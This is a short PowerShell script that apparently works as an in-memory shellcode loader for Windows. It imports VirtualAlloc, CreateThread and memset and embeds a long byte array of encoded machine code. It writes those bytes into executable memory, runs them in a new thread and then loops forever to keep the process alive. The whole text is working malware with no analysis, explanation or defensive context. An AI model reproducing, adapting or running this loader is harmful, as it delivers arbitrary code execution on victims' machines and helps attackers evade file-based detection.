$r8kaDS = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $r8kaDS -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xee,0xba,0x65,0x2e,0x29,0x0e,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x14,0x03,0x50,0x71,0xcc,0xdc,0xf2,0x91,0x92,0x1f,0x0b,0x61,0xf3,0x96,0xee,0x50,0x33,0xcc,0x7b,0xc2,0x83,0x86,0x2e,0xee,0x68,0xca,0xda,0x65,0x1c,0xc3,0xed,0xce,0xab,0x35,0xc3,0xcf,0x80,0x06,0x42,0x53,0xdb,0x5a,0xa4,0x6a,0x14,0xaf,0xa5,0xab,0x49,0x42,0xf7,0x64,0x05,0xf1,0xe8,0x01,0x53,0xca,0x83,0x59,0x75,0x4a,0x77,0x29,0x74,0x7b,0x26,0x22,0x2f,0x5b,0xc8,0xe7,0x5b,0xd2,0xd2,0xe4,0x66,0xac,0x69,0xde,0x1d,0x2f,0xb8,0x2f,0xdd,0x9c,0x85,0x80,0x2c,0xdc,0xc2,0x26,0xcf,0xab,0x3a,0x55,0x72,0xac,0xf8,0x24,0xa8,0x39,0x1b,0x8e,0x3b,0x99,0xc7,0x2f,0xef,0x7c,0x83,0x23,0x44,0x0a,0xcb,0x27,0x5b,0xdf,0x67,0x53,0xd0,0xde,0xa7,0xd2,0xa2,0xc4,0x63,0xbf,0x71,0x64,0x35,0x65,0xd7,0x99,0x25,0xc6,0x88,0x3f,0x2d,0xea,0xdd,0x4d,0x6c,0x62,0x11,0x7c,0x8f,0x72,0x3d,0xf7,0xfc,0x40,0xe2,0xa3,0x6a,0xe8,0x6b,0x6a,0x6c,0x0f,0x46,0xca,0xe2,0xee,0x69,0x2b,0x2a,0x34,0x3d,0x7b,0x44,0x9d,0x3e,0x10,0x94,0x22,0xeb,0x8d,0x91,0xb4,0x43,0x84,0x25,0x3c,0x04,0x2a,0x5a,0xad,0x88,0xa3,0xbc,0x9d,0x60,0xe4,0x10,0x5d,0xd1,0x44,0xc1,0x35,0x3b,0x4b,0x3e,0x25,0x44,0x81,0x57,0xcf,0xab,0x7c,0x0f,0x67,0x55,0x25,0xdb,0x16,0x9a,0xf3,0xa1,0x18,0x10,0xf0,0x56,0xd6,0xd1,0x7d,0x45,0x8e,0x11,0xc8,0x37,0x18,0x2d,0xe6,0x52,0xa4,0xbb,0x0d,0xf5,0xf3,0x53,0x0c,0x20,0x33,0xfc,0xef,0x07,0x48,0x35,0x7a,0xe8,0x26,0x3a,0x6a,0xe8,0xb6,0x6c,0xe0,0xe8,0xde,0xc8,0x50,0xbb,0xfb,0x16,0x4d,0xaf,0x50,0x83,0x6e,0x86,0x05,0x04,0x07,0x24,0x70,0x62,0x88,0xd7,0x57,0x72,0xf4,0x01,0x91,0x00,0x14,0x92;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$r8k=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($r8k.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$r8k,0,0,0);for (;;){Start-sleep 60};